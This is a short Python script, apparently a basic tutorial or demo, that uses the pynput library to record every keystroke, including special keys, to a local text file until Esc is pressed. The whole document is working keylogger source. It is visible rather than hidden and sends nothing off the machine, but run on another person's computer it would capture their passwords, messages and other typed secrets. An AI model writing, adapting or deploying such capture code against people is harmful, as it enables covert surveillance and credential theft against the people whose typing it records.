import os
from pynput import keyboard

# Define the log file path where keystrokes will be saved
KEYLOGGER_LOG_FILE = "real_time_keystrokes.txt"

def on_press(key):
    try:
        # For alphanumeric keys, key.char gives the character
        logged_key = key.char
        if logged_key is not None:
            with open(KEYLOGGER_LOG_FILE, "a") as f:
                f.write(logged_key)
            print(f"Logged: {logged_key}")
    except AttributeError:
        # For special keys (like space, enter, shift, etc.), key is an object
        # Convert special keys to a readable string (e.g., 'Key.space', 'Key.enter')
        logged_key_str = str(key)
        with open(KEYLOGGER_LOG_FILE, "a") as f:
            f.write(f"[{logged_key_str}]") # Wrap special keys in brackets for clarity
        print(f"Logged: [{logged_key_str}]")

def on_release(key):
    if key == keyboard.Key.esc:
        print("\n[*] 'Esc' key pressed. Stopping real-time keylogger.")
        return False # This stops the keyboard listener thread

def start_keylogger():
    print(f"[*] Starting real-time keylogger. All keystrokes will be saved to '{KEYLOGGER_LOG_FILE}'.")
    print("Press 'Esc' to stop the keylogger.")

    # Create a listener for keyboard events
    # 'on_press' is called when a key is pressed
    # 'on_release' is called when a key is released
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        # This blocks the main thread until the listener is stopped
        # (in this case, when 'on_release' returns False, i.e., 'Esc' is pressed)
        listener.join()
    print("[+] Keylogger stopped.")

if __name__ == "__main__":
    start_keylogger()
